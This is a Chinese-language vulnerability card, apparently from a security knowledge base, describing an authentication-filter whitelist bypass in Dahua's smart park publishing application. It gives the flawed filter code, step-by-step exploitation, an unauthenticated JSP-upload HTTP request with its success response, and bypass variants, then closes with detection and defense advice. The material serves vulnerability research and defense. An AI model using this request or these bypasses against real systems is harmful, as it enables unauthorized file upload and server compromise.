---
id: web-java-component-dahua-publishing-userauthenticationfilter-path-whitelist-bypass
title: 大华智慧园区 publishing UserAuthenticationFilter 路径包含即放行：/publishing/publishing/* 与 css/js/png/gif 后缀全模块未授权
type: scenario
domain: web
path: web/java/component
technique: dahua-publishing-filter-path-whitelist-bypass
aliases:
- UserAuthenticationFilter 绕过
- publishing 未授权
- allowFileType 后缀白名单
- simpleMatch 路径放行
- 大华 publishing Filter
tags:
- java
- dahua
- wpms
- auth-bypass
- filter
- whitelist
- spring
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V383
  verified_at: '2026-11-09T08:54:04+08:00'
  notes: 已对照原文核对：web.xml authFilter 映射 /*、allowFileType=.css;.js;.png;.gif、simpleMatch("*/publishing/publishing/*") 放行及后缀白名单逻辑与截图一致，未带 Cookie 的 /publishing/publishing/material/file/video 上传成功响应佐证；未验证点：控制器统一位于 /publishing/publishing/ 下系据 MaterialController 推断，JSP 实际执行依赖部署；上传 sink 细节已由既有 material 卡覆盖。
---

## 一句话结论

大华智慧园区 publishing 应用的 `UserAuthenticationFilter` 在 `doFilter` 里对请求 URI 做两类“白名单即放行”：`PatternMatchUtils.simpleMatch("*/publishing/publishing/*", requestURI)` 命中就直接 `chain.doFilter`；或者 URI 含 `.` 且后缀在 `allowFileType`（`.css;.js;.png;.gif`）中也直接放行。由于该应用的控制器路径全部以 `/publishing/publishing/` 开头，整个模块（包括 `/publishing/publishing/material/file/video` 文件上传）都可未登录访问，原文未带任何 Cookie 即上传成功 `.jsp`。

## 原理

- **Filter 配置**：`publishing/WEB-INF/web.xml` 将 `authFilter`（`com.dahua.cardsolution.authentication.UserAuthenticationFilter`）映射到 `/*`，并配置 `allowFileType=.css;.js;.png;.gif`。
- **放行逻辑**（`UserAuthenticationFilter.doFilter`）：
  ```java
  String requestURI = request.getRequestURI();
  logger.info("requestURI is url " + requestURI);
  if (PatternMatchUtils.simpleMatch("*/publishing/publishing/*", requestURI)) { // 不鉴权
      chain.doFilter(request, response);
  }
  UserToken token = ContextUtil.getDssLoginToken(session);
  if (token == null) { request.getRequestDispatcher("/timeout").forward(...); }
  else {
      ...
      if (requestURI.contains(".")) {
          if (fileTypeList.contains(requestURI.substring(requestURI.lastIndexOf(".")))) {
              chain.doFilter(request, response);
              return;
          }
      }
      // 其余走 token 校验
  }
  ```
- **为什么整个模块失守**：publishing 的 Spring MVC 控制器（`MaterialController`、`PlanController`、`PlayerController` 等）映射路径都在 `/publishing/publishing/...` 下，全部命中第一个 `simpleMatch`，因此鉴权 Filter 对所有业务接口等价于不存在。
- **第二个绕过面**：只要请求 URI 以 `.css`/`.js`/`.png`/`.gif` 结尾（且路由能忽略多余后缀）也会跳过鉴权；对静态资源无可厚非，但若动态接口允许路径后缀（`;`、`%00` 等解析差异），可扩大未授权面。
- **影响验证**：原文对 `/publishing/publishing/material/file/video` 发送 multipart，字段 `Filedata`、文件名 `1.jsp`，未带会话仍返回 `{"data":{"id":414,"path":"VIDEO/230815141310178625.jsp",...},"success":true}`，证明未授权到达上传控制器。该上传 sink 本身已另有卡片覆盖，本卡聚焦 Filter 白名单绕过。

## 触发条件

- 目标部署了大华智慧园区 publishing 应用，`/publishing/*` 可访问。
- `UserAuthenticationFilter` 使用 `*/publishing/publishing/*` 这类宽松通配或静态后缀白名单，且未在拦截后再做接口级鉴权。
- 目标业务接口路由位于该模式覆盖的路径下。

## 利用步骤

1. 请求任意 `/publishing/publishing/...` 业务接口（如上传、列表、配置），不携带任何会话 Cookie。
2. 观察是否直接返回业务响应（而非 `/timeout` 转发或登录页），确认 Filter 被 `simpleMatch` 放行。
3. 以未授权状态调用敏感接口：原文用 `POST /publishing/publishing/material/file/video` 上传 `1.jsp` 并成功写入。
4. 若接口路径不在该前缀下，尝试在末尾追加 `.css`/`.png` 等后缀，测试 Filter 的后缀白名单与 Spring 路由后缀匹配组合。
5. 记录未授权请求/响应证据后停止。

## PoC

```http
POST /publishing/publishing/material/file/video HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="Filedata"; filename="1.jsp"
Content-Type: image/jpeg

test123
------x--
```

```json
// 未携带 Cookie 的响应
{"data":{"id":414,"path":"VIDEO/230815141310178625.jsp","errMsg":"success!"},"success":true}
```

该响应证明请求已通过 `authFilter` 进入 `MaterialController` 的 `addVideoFile`；上传命名/落盘细节见关联卡片。

## 变体与关联

- 变体：把动态接口改写成 `/publishing/publishing/xxx.css` 形式，利用后缀白名单二次绕过（取决于 Spring 路由是否匹配后缀）。
- 变体：通配符 `*/publishing/publishing/*` 对 URI 的匹配较宽，若网关做了路径归一化差异（`..;/`、双斜杠、大小写），可能出现“Filter 认为不是该前缀、Spring 认为匹配控制器”的分歧，可进一步扩大绕过。
- 关联：[[web-java-component-dahua-material-file-upload-webshell]]（本卡放行后到达的上传 sink）、[[web-java-component-dahua-emap-myinterceptor-catch-auth-bypass]]（同平台另一模块的拦截器异常绕过）、[[web-generic-auth-403-resource-suffix-path-dictionary-bypass]]（后缀/路径白名单绕过的通用形态）。

## 检测与防御

- 防御：鉴权 Filter 改为精确路径白名单（登录、静态目录），不要用 `*/模块/模块/*` 这类覆盖业务全模块的通配；静态后缀白名单只对静态资源目录生效，且要在规范化路径后判断。
- 防御：业务 Controller 层对敏感操作做二次鉴权（登录态 + 权限），不依赖 Filter 这一道。
- 检测：未登录请求 `/publishing/publishing/*` 业务接口（尤其是 POST/multipart）；同一 IP 对 publishing 模块的批量接口探测；上传后短时间访问新生成的 `.jsp`。
